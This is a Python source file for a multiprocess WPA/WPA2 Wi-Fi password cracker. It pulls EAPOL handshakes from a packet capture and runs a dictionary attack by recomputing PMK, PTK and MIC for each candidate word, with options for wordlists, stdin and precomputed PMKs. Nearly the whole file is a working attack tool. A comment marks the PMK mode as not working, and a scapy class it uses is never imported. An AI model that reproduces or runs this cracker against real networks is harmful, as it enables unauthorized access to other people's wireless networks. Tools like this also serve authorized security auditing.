#!/usr/bin/env python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import argparse
import sys, os, time, signal
import hmac,hashlib,binascii
from scapy.all import EAPOL, Dot11Beacon, rdpcap
from pbkdf2_ctypes import pbkdf2_bin
from prettytable import PrettyTable
from multiprocessing import Pool, Queue, cpu_count
from threading import Thread

# Change working directory
os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])))

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssid", help="Specify SSID to of network to crack")
parser.add_argument("-c", "--capture", help="Specify location of thepacket capture file")
parser.add_argument("-w", "--wordlist", help="Specify location of the wordlist file")
parser.add_argument("-p", "--pmk", help="Specify the pre-computed pmk wordlist file")
parser.add_argument("--gen-pmk",
					help="Pre-compute PMK for a certain wordlist, has to be passed with the -w option",
					action="store_true")
parser.add_argument("--stdin", 
					help="Read words from stdin so word generator programs can pipe into the cracker",
					action="store_true")
prog_args = parser.parse_args()


class HalfWPAHandshake(object):

	def __init__(self, 	ssid = None, ap_mac = None, client_mac = None,
						aNonce = None, sNonce = None, mic = None, data = None):
		self.ascii_ap_mac = ap_mac
		self.ascii_client_mac = client_mac

		try:
			self.ap_mac 	= binascii.a2b_hex(ap_mac)
			self.client_mac = binascii.a2b_hex(client_mac)
		except:
			self.ap_mac 	= None
			self.client_mac = None

		self.ssid 		= ssid
		self.aNonce		= aNonce
		self.sNonce		= sNonce
		self.mic		= mic
		self.data		= data

	def complete_info(self, half_handshake):
		if self.ap_mac == None and half_handshake.ap_mac != None:
			self.ap_mac = half_handshake.ap_mac

		if self.client_mac == None and half_handshake.client_mac != None:
			self.client_mac = half_handshake.client_mac

		if self.aNonce == None and half_handshake.aNonce != None:
			self.aNonce = half_handshake.aNonce

		if self.sNonce == None and half_handshake.sNonce != None:
			self.sNonce = half_handshake.sNonce

		if self.mic == None and half_handshake.mic != None:
			self.mic = half_handshake.mic

		if self.data == None and half_handshake.data != None:
			self.data = half_handshake.data

	def extract_info(self, packet):
		if EAPOL not in packet:
			return

		eapol_packet = packet["EAPOL"]
		# check if it is the first or second frame
		if eapol_packet.flags not in [17, 33]:
			return


		frame_number = 1 if eapol_packet.flags == 17 else 2

		if frame_number == 1:
			self.ascii_ap_mac		= packet.src
			self.ascii_client_mac 	= packet.dst
			self.ap_mac 	= binascii.a2b_hex(packet.src.replace(":",""))
			self.client_mac = binascii.a2b_hex(packet.dst.replace(":",""))
			self.aNonce		= eapol_packet.nonce
		else:
			self.ascii_ap_mac		= packet.dst
			self.ascii_client_mac 	= packet.src
			self.ap_mac 	= binascii.a2b_hex(packet.dst.replace(":",""))
			self.client_mac = binascii.a2b_hex(packet.src.replace(":",""))
			self.sNonce		= eapol_packet.nonce
			self.mic		= eapol_packet.mic
			self.data		= self._calculate_data_bytes(packet)

	def _calculate_data_bytes(self, packet):
		if EAPOL not in packet:
			return

		eapol_packet = packet["EAPOL"]
		if eapol_packet.flags != 33:
			return

		eapol_offset = len(str(packet)) - len(str(eapol_packet))
		mic_index	 = str(packet).index(eapol_packet.mic)
		data = str(packet)[eapol_offset:mic_index] + "\x00" * 16 + str(packet)[mic_index+16:]

		return data		

	def is_complete(self):
		return (self.ap_mac and self.client_mac and 
				self.aNonce and self.sNonce and 
				self.mic and self.data) != None

def find_half_handshakes(captured_packets):
	half_handshakes = []
	for packet in captured_packets:
		#TODO parse ssid from beacon
		ssid = None
		if Dot11Beacon in packet:
			if packet.haslayer(Dot11Elt):                          
				elt_layer = packet[Dot11Elt]
				if elt_layer.ID == 0:
					ssid = elt_layer.info
				
		if EAPOL not in packet:
			continue

		half_handshake = HalfWPAHandshake(ssid = ssid)
		half_handshake.extract_info(packet)

		found_pair = False
		for hhandshake in half_handshakes:
			if 	hhandshake.ap_mac == half_handshake.ap_mac and \
				hhandshake.client_mac == half_handshake.client_mac:
				hhandshake.complete_info(half_handshake)
				found_pair = True

		if not found_pair:
			half_handshakes.append(half_handshake)

	return half_handshakes

def PRF512(pmk,A,B):
	ptk1 = hmac.new(pmk, binascii.a2b_qp(A)+ B + chr(0), hashlib.sha1).digest()
	ptk2 = hmac.new(pmk, binascii.a2b_qp(A)+ B + chr(1), hashlib.sha1).digest()
	ptk3 = hmac.new(pmk, binascii.a2b_qp(A)+ B + chr(2), hashlib.sha1).digest()
	ptk4 = hmac.new(pmk, binascii.a2b_qp(A)+ B + chr(3), hashlib.sha1).digest()
	return ptk1+ptk2+ptk3+ptk4[0:4]

def test_word(ssid, clientMac, APMac, Anonce, Snonce, mic, data):
	global result_queue, found_password
	pke_data = '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
	while not found_password:
		word = word_queue.get(block = True, timeout = 1)
		found_password = compare_mic(ssid, clientMac, APMac, Anonce, Snonce, mic, data, pke_data, word)
		result_queue.put((found_password, word))

	return None

# Not working...
def test_pmk(clientMac, APMac, Anonce, Snonce, mic, data):
	global result_queue, found_password, word_pmk_map
	pke_data = '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
	while not found_password:
		word = word_queue.get(block = True, timeout = 1)
		ptk = PRF512(word_pmk_map[word], "Pairwise key expansion", pke_data)
		kck = ptk[:16]

		if ord(data[6]) & 0b00000010 == 2:
			calculatedMic = hmac.new(kck,data,hashlib.sha1).digest()[0:16]
		else:
			calculatedMic = hmac.new(kck,data).digest()

		result_queue.put((mic == calculatedMic, word))


def compare_mic(ssid, clientMac, APMac, Anonce, Snonce, mic, data, pke_data, word):
	pmk = pbkdf2_bin(word, ssid, 4096, 32)
	ptk = PRF512(pmk, "Pairwise key expansion", pke_data)
	kck = ptk[:16]

	if ord(data[6]) & 0b00000010 == 2:
		calculatedMic = hmac.new(kck,data,hashlib.sha1).digest()[0:16]
	else:
		calculatedMic = hmac.new(kck,data).digest()

	if mic == calculatedMic:
		return True

	return False

def count_results():
	global calculated_mics, result_queue, found_password

	# Gets the results from the result_queue that is filled up by the processes.
	# The timeout is there so it doesn't stop counting immediatly after the queue is empty
	# Although it is safe to stop it after a second which means the program was either interrupted or has finished
	try:
		result, word = False, ""
		while not result:
			result, word = result_queue.get(timeout = 1)
			calculated_mics += 1
		print "Cracked Password:\t", word
		log_password(prog_args.ssid, word)
	except:
		pass

	print "Time elapsed:\t", time.time() - start_time
	found_password = True

def log_password(ssid, password):
	with open(ssid + ".cracked", "w") as password_file:
		result_string = "Cracked Password:\nSSID:\t{}\nPASSWORD:\t{}\n".format(ssid, password)
		password_file.write(result_string)

def add_from_stdin():
	global word_queue, found_password
	try:
		for line in iter(sys.stdin.readline, ""):
			if found_password: break
			word_queue.put(line.strip(), block = True, timeout = 1)
	except:
		# Exception will be raised when word_queue is full
		pass

def add_from_pmks():
	# Read words from pmk and add correspondence to hashmap
	# Instead of test_word in cracker pool use test_pmk
	global word_queue, found_password, word_pmk_map
	with open(prog_args.pmk, "r") as pmk_file:
			print "[+] Loading words into cracking queue"
			nLines = 0
			for line in pmk_file:
				try:
					word, pmk = line.split(":")
					word_queue.put(word.strip(), block = True)
					word_pmk_map[word] = pmk.strip()
					nLines += 1
					print "[+] Loaded {} Word:PMK pairs from PMK File\r".format(nLines),
				except: pass
			print "\n"

def add_from_wordlist():
	global word_queue, found_password
	with open(prog_args.wordlist, "r") as wordlist_file:
			print "[+] Loading words into cracking queue"
			nLines = 0
			for line in wordlist_file:
				word_queue.put(line.strip(), block = True)
				nLines += 1
				print "[+] Loaded {} words from wordlist\r".format(nLines),
			print "\n"
		
def pre_compute_pmks(ssid):
	outfile_name = ssid + ".pmks"
	print "[+] Saving computed PMKS to:", outfile_name
	with open(outfile_name, "w") as pmks_out:
		while True: # Will break on exception which means all words were read
			try:
				word = word_queue.get(block = True, timeout = 1)
				pmk = pbkdf2_bin(word, ssid, 4096, 32)
				pmks_out.write(word + ":" + pmk + "\n")
			except Exception as e:
				print e
				break

def present_read_handshakes(hhandshakes):
	headers = ["ID", "AP Mac", "Client Mac", "SSID", "Frame1", "Frame2"]
	table = PrettyTable(headers)
	id = 0
	for hs in hhandshakes:
		args = [id, hs.ascii_ap_mac, hs.ascii_client_mac, hs.ssid, hs.aNonce != None, hs.sNonce != None ]
		table.add_row(args)
		id += 1

	print table

def choose_handshake(hhandshakes, ssid):
	if ssid != None:
		if len(hhandshakes) == 1:
			chosen_handshake = hhandshakes[0]
			chosen_handshake.ssid = ssid
			return chosen_handshake

		for hs in hhandshakes:
			if hs.ssid == ssid:
				return hs

		print "[-] No handshakes found by that SSID, please choose one from the list."
	
	while(True):
		try:
			chosen_handshake_id = int(raw_input("Which of the handshakes would you like to crack?\n"))
			chosen_handshake = hhandshakes[chosen_handshake_id]
			break
		except:
			if found_password:
				sys.exit(0)
			print "[-] Chosen handshake id must be an integer and in the presented list"

	if chosen_handshake.ssid == None:
		if ssid != None:
			chosen_handshake.ssid = ssid
		else:
			chosen_handshake.ssid = raw_input("Please enter the SSID of the chosen network:\n").strip()

	return chosen_handshake

def interruption_handler(sig, frame):
	global found_password
	found_password = True
	if sig == signal.SIGINT:
		print "[+] Password cracking interrupted."
	else:
		print "[+] Password cracking stopped."
		sys.exit(0)

signal.signal(signal.SIGINT, interruption_handler)
signal.signal(signal.SIGTSTP, interruption_handler)


if __name__ == '__main__':
	if not ((prog_args.capture or prog_args.gen_pmk) and (prog_args.stdin or prog_args.wordlist or prog_args.pmk)):
		print "[-] Not enough arguments to start dictionary attack!"
		sys.exit(1)

	cracker_running = False
	found_password = False
	word_queue = Queue(maxsize = 1000000)
	result_queue = Queue(maxsize = 1000000)
	word_pmk_map = {}
	calculated_mics = 0

	if prog_args.stdin:
		print "[+] Starting stdin reader"
		Thread(target=add_from_stdin).start()
	elif prog_args.pmk:
		print "[+] Starting PMK reader"
		Thread(target=add_from_pmks).start()
	else:
		print "[+] Starting wordlist reader"
		Thread(target=add_from_wordlist).start()

	# Just Pre-Compute PMKS
	if prog_args.gen_pmk:
		if prog_args.ssid != None:
			pre_compute_pmks(prog_args.ssid)
			os._exit(0)
		else:
			print "[-] Please enter a SSID to pre-compute the PMKs"
			os._exit(1)

	captured_packets = rdpcap(prog_args.capture)
	half_handshakes = find_half_handshakes(captured_packets)

	present_read_handshakes(half_handshakes)
	hhs = choose_handshake(half_handshakes, prog_args.ssid)
	if hhs == None:
		os._exit(1)

	cpu_count = cpu_count()
	cracker_pool = Pool(cpu_count)

	# Actually try to crack network password
	if hhs.is_complete():
		start_time = time.time()
		Thread(target=count_results).start()
		

		print "[+] Preparing Process Pool of size", cpu_count
		if prog_args.pmk:
			args =  [	hhs.client_mac, hhs.ap_mac, 
						hhs.aNonce, hhs.sNonce, hhs.mic, hhs.data	]
			for _ in range(cpu_count):
				cracker_pool.apply_async(test_pmk, args)
		else:
			args =  [	hhs.ssid, hhs.client_mac, hhs.ap_mac, 
						hhs.aNonce, hhs.sNonce, hhs.mic, hhs.data	]
			for _ in range(cpu_count):
				cracker_pool.apply_async(test_word, args)
		cracker_pool.close()


		while not found_password:
			elapsed_time 	= time.time() - start_time
			tries_per_sec 	= calculated_mics / elapsed_time
			print "Elapsed_Time:\t{} seconds".format(elapsed_time)
			print "Total Keys Tried:\t{}".format(calculated_mics)
			print "Tries per second:\t{}".format(tries_per_sec)
			time.sleep(2)

		cracker_pool.terminate()
		cracker_pool.join()
	else:
		print "[-] The chosen half handshake is not complete and cannot be cracked."
		print "[*] Choose one that has both Frame1 and Frame2 flags set to True"
